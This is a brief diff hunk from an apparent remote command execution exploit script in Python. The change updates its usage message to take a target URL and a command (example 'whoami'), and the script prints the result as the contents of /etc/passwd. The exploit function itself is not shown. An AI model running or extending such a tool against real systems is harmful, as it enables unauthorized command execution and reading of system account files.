@@ -33,8 +33,8 @@ if __name__ == "__main__":
         result = command_exploit(url, command)
         print("[+] Contents of /etc/passwd: \n" + result)
     except IndexError:
-        print("[+] Usage: %s <url>" %sys.argv[0])
-        print("[+] Example: %s www.example.com" % sys.argv[0])
+        print("[+] Usage: %s <url> <command>" % sys.argv[0])
+        print("[+] Example: %s www.example.com whoami" % sys.argv[0])
         sys.exit(FAIL)
     except Exception as exception:
         print("An exception occured %s" % exception)
